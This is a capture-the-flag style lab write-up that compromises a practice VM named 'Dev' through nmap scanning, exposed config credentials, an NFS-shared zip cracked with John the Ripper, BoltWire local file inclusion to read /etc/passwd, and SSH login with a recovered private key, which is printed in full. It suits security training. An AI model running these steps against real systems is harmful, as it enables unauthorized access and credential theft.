### Target Name: Dev

### Target IP: 192.168.57.8

### Attacker IP: 192.168.57.4

# -- Scanning & Enumeration --

# Open Ports

```
┌──(root㉿kali)-[~]
└─# nmap -T4 -p- 192.168.57.8
...
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
8080/tcp  open  http-proxy
33155/tcp open  unknown
36849/tcp open  unknown
37197/tcp open  unknown
51149/tcp open  unknown
```

# Operating System & Service Versions (+ additional info)

```
┌──(root㉿kali)-[~]
└─# nmap -T4 -sV -sC -p 22,80,111,2049,8080,33155,36849,37197,51149 192.168.57.8
...
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
...
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
	|_http-server-header: Apache/2.4.38 (Debian)
	|_http-title: Bolt - Installation error
...
111/tcp   open  rpcbind  2-4 (RPC #100000)
...
2049/tcp  open  nfs      3-4 (RPC #100003)
8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
	| http-open-proxy: Potentially OPEN proxy.
	|_Methods supported:CONNECTION
	|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
	|_http-server-header: Apache/2.4.38 (Debian)
...
33155/tcp open  mountd   1-3 (RPC #100005)
36849/tcp open  nlockmgr 1-4 (RPC #100021)
37197/tcp open  mountd   1-3 (RPC #100005)
51149/tcp open  mountd   1-3 (RPC #100005)
...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# HTTP (80/TCP; 8080/TCP)

### via NMAP

```
┌──(root㉿kali)-[/home/kali]
└─# nmap -T4 -sV -sC -p 22,80,111,2049,8080,33155,36849,37197,51149 192.168.57.8
...
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
	|_http-server-header: Apache/2.4.38 (Debian)
	|_http-title: Bolt - Installation error
...
8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.38 (Debian)
```

### via Browser (+ FFUF)
## :80

##### Default Page; Information Disclosure

![Screenshot 2026-08-19 234955](../../assets/Screenshot%202026-08-19%20234955.png)

##### Information Disclosure

![Pasted image 20260820002140](../../assets/Pasted%20image%2020260820002140.png)

##### Information Disclosure

![Pasted image 20260820002202](../../assets/Pasted%20image%2020260820002202.png)

##### Openly available internal server files

![Pasted image 20260820002552](../../assets/Pasted%20image%2020260820002552.png)

##### Internal server error when trying to open CustomisationExtension.php

![Screenshot 2026-08-20 002606](../../assets/Screenshot%202026-08-20%20002606.png)

##### Openly available /app 

![Pasted image 20260820004256](../../assets/Pasted%20image%2020260820004256.png)

##### Credentials disclosed in /app/config/config.yml | DB on sqlite

![Pasted image 20260820003503](../../assets/Pasted%20image%2020260820003503.png)

##### Permission hierarchy information in /app/config/permissions.yml

![Pasted image 20260820004016](../../assets/Pasted%20image%2020260820004016.png)

##### Credentials and full configuration in /app/cache/config-cache.json

![Screenshot 2026-08-20 004400](../../assets/Screenshot%202026-08-20%20004400.png)

## :8080

##### Default Page; Information Disclosure
![Screenshot 2026-08-19 235305](../../assets/Screenshot%202026-08-19%20235305.png)

##### BoltWire Page under /dev/

![Pasted image 20260820011143](../../assets/Pasted%20image%2020260820011143.png)

##### User credentials under /dev/pages/

![Pasted image 20260820011309](../../assets/Pasted%20image%2020260820011309.png)

##### Administrator credentials in /dev/pages/member.admin

![Pasted image 20260820011431](../../assets/Pasted%20image%2020260820011431.png)

##### Information Disclosure (when accessed through admin account)

![Pasted image 20260820011618](../../assets/Pasted%20image%2020260820011618.png)

##### Restricted file upload capabilities as an admin or editor (good)

![Pasted image 20260820013333](../../assets/Pasted%20image%2020260820013333.png)

![Screenshot 2026-08-20 013355](../../assets/Screenshot%202026-08-20%20013355.png)

##### Restrictions for uploading listed in Config section (an allow-list, not a deny-list - good)

![Screenshot 2026-08-20 013725](../../assets/Screenshot%202026-08-20%20013725.png)

### via BurpSuite

## :80

#### Information Disclosure

![Pasted image 20260820000851](../../assets/Pasted%20image%2020260820000851.png)

## :8080

#### Information Disclosure

![Pasted image 20260820000626](../../assets/Pasted%20image%2020260820000626.png)

# RPC/NFS (111/2049)

### via CLI

#### access to encrypted zip file

```
┌──(root㉿kali)-[~]
└─# showmount -e 192.168.57.8

Export list for 192.168.57.8:
/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16

┌──(root㉿kali)-[/mnt/nfs]
└─# ls

save.zip

┌──(root㉿kali)-[/mnt/nfs]
└─# unzip save.zip       

Archive:  save.zip
[save.zip] id_rsa password: 
```

### via John The Ripper

#### zip file password hash cracked with rockyou.txt (password: java101)

```
┌──(root㉿kali)-[/mnt/nfs]
└─# zip2john save.zip > hash.txt

ver 2.0 efh 5455 efh 7875 save.zip/id_rsa PKZIP Encr: TS_chk, cmplen=1435, decmplen=1876, crc=15E468E2 ts=2A0D cs=2a0d type=8
ver 2.0 efh 5455 efh 7875 save.zip/todo.txt PKZIP Encr: TS_chk, cmplen=138, decmplen=164, crc=837FAA9E ts=2AA1 cs=2aa1 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

┌──(root㉿kali)-[/mnt/nfs]
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
No password hashes left to crack (see FAQ)

┌──(root㉿kali)-[/mnt/nfs]
└─# john hash.txt --show                                     

save.zip:java101::save.zip:todo.txt, id_rsa:save.zip

1 password hash cracked, 0 left
```

### via CLI

#### SSH Private Key and employee's To-Do list in save.zip

```
┌──(root㉿kali)-[/mnt/nfs]
└─# unzip save.zip 

Archive:  save.zip
[save.zip] id_rsa password: 
  inflating: id_rsa                  
  inflating: todo.txt

┌──(root㉿kali)-[/mnt/nfs]
└─# cat todo.txt 

- Figure out how to install the main website properly, the config file seems correct...
- Update development website
- Keep coding in Java because it's awesome

jp

┌──(root㉿kali)-[/mnt/nfs]
└─# cat id_rsa  

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDVFCI+ea
0xYnmZX4CmL9ZbAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQC/kR5x49E4
0gkpiTPjvLVnuS3POptOks9qC3uiacuyX33vQBHcJ+vEFzkbkgvtO3RRQodNTfTEB181Pj
3AyGSJeQu6omZha8fVHh/y2ZMRjAWRs+2nsT1Z/JONKNWMYEqQKSuhBLsMzhkUEEbw3WLq
S0kiHCk/0VnPZ8EdMCsMGdj2MUm+ccr0GZySFg5SAJzJw2BGnjFSS+dERxb7e9tSLgDv4n
Wg7fWw2dcG956mh1ZrPau7Gc1hFHQLLUHPgXx3Xp0f5/pGzkk6JACzCKIQj0Qo3ueb6JSC
xWgwn6ey6XywTi9i7TdfFyCSiFW//jkeczyaQOxI/hyqYfLeiRB3AAAD0PHU/4RN8f2HUG
ks1NM9+C9B+Fpn+nGjRj6/53m3HoBaUb/JZyvUvOXNoYnxNKIxHP5r4ytsd8X8xp5zTpi1
tNmTeoB1kyoi2Uh70yPo4M6VlNupSeCzMQIYs/Wqya4ycyv1/yhGAPTZg8ARqop/RTQJtI
EYVDbTxKxr7JGBfaBPiFWdUIKlN1yBXWMRrIs3SBoOaQ/n+CZKQ65mMFRs4VwqpUsRJ8y7
ZoLZIfwaunV5f10PsCR8rp/2g563gK0bu+iVUqeo+kJMtFN7yEj2OaO6N/EdO4x/LVhqjY
SPZD6w23mPp2I693oop1VpITsHV2talK1lLvS239gU45J4VlxFtcLjRlSAhc1ktnHw1e4u
dRZ68JW0z2S4Y8q4EO/H4kGlZsyaf6oLCspGW1YQPhDJ2v6KkgRXyFb3tvo617yGEcBzzh
wrVuEXObOc+zDOYgw1a/1x1pzK5vGQWaUOjN2FEz+vnSPTX3cbgUkLh3ZshuVzov0Rx7i+
AM0CNiXVmgCGdLg0yBIv8lFIjYxswxTRkNzKYSagEZQNFCf+0H1cZcXKCK8z9a2NvBkQ/b
rGvuoZuIjGqGvMP3Ifdma7PsG3A8GNOgWnl9YuMgc4r2WulsQVLVEJGIJjap71oNwGCUud
T1Ou2tVn7Cf0T/NmuRmh7VUkTagDMf3u5X+UIST5Sv8y2y9jgR4x92ZL+AY968Pif1devc
753z+GL7eWfbNqd+TJfxPdh82EqE5cmN/jYOKc0D1MC2zVChNCVWQYf4uVQ0L/XOXQXnFT
hWdHfnf/SXos28dSM7Kx6B3jmeZQ60vk0Apas0D9gLz5xZ9GCb0Dwwka4dBSw57cwBbB3E
PKXqJFks2ZnkyVL1W8u6ovnkpcqQz1mxr42zdC52Jc30NYww7H2G7v7FYKtf6tEyzeXG2+
rcZwO4evWbV158rzrA4ibsGRn8+PM86LI/7T5/Y5pc2T+TAaDjKLRZ0Dtv5nMvHpigqDu4
+e/eQk9dTmMPv9jbqcHeRo7N/Q8EC4vtXj/pCPydB5lYw/GMb8Bq5opXzADx0n4zDLtGDC
LHcAIF6FMa+kLQHKvG1fDIK2xpLz+HxYCYTS/UAVRtWAdzQ29uG8zFAopGoQGbNA+caq7z
iLUBEWHXJktNenIrfF3rqB3m8SNyNIn+MQS3LIakhlHAqXMIWU2pQE/0tF+V8xuKRpZvw/
gdhLfAhm2gZMQzOe1cXWhKmtEQUntPdPAyfOTZcUtcs/pKNEjNTz5YnhQqnDbAh5x46UgZ
q4xpWBvdz0v8qwF6LXLdPBEcT4TOg=
-----END OPENSSH PRIVATE KEY-----
```

---

# -- Version Research (Potential Vulnerabilities) --

### via SearchSploit

#### Apache 2.4.38

```
┌──(root㉿kali)-[/home/kali]
└─# searchsploit apache 2
```

```
Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation
```

#### BoltWire 6.03

```
┌──(root㉿kali)-[~]
└─# searchsploit boltwire
```

```
BoltWire 6.03 - Local File Inclusion
```

![](../../../Pasted%20image%2020260821183859.png)
### via Browser

#### Apache 2.4.38

![](../../../Pasted%20image%2020260821183227.png)

#### BoltWire 6.03

##### Local File Inclusion - applied

![](../../../Pasted%20image%2020260821184108.png)

```
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin  
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin  
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin  
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin  
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin  
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin  
jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash  
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin  
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false  
_rpc:x:107:65534::/run/rpcbind:/usr/sbin/nologin  
statd:x:108:65534::/var/lib/nfs:/usr/sbin/nologin
```

---

# -- Exploitation --

### via common sense

**The id_rsa in archive available via NFS - passwordless ssh connection;
Username? someone who signs as `-jp`;
`jp@192.168.57.8` doesn't work;
Local File Inclusion exploit on BoltWire web server -> list of usernames;
one of the usernames -> jeanpaul (matches jp);
attempt on `jeanpaul@192.168.57.8` works, but requires a passphrase;
previously gathered passwords: `java101`, `I_love_java`;
`java101` -> fail, `I_love_java` -> successful login**

### via CLI

```
┌──(root㉿kali)-[~]
└─# ssh jeanpaul@192.168.57.8

Enter passphrase for key '/root/.ssh/id_rsa': *I_love_java* (hidden)

Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Aug 21 14:06:32 2026 from 192.168.57.4

jeanpaul@dev:~$ whoami
jeanpaul
```

```
jeanpaul@dev:~$ ip a

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:e4:c4:e1 brd ff:ff:ff:ff:ff:ff
    inet 192.168.57.8/24 brd 192.168.57.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fee4:c4e1/64 scope link 
       valid_lft forever preferred_lft forever
```

```
jeanpaul@dev:~$ id

uid=1000(jeanpaul) gid=1000(jeanpaul) groups=1000(jeanpaul),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

---

# -- Post-Exploitation --

## Privilege Escalation

### PrivEsc Vectors Investigation

#### ...

### Applying found vectors

#### ...

---
##### NOTE IF NEEDED

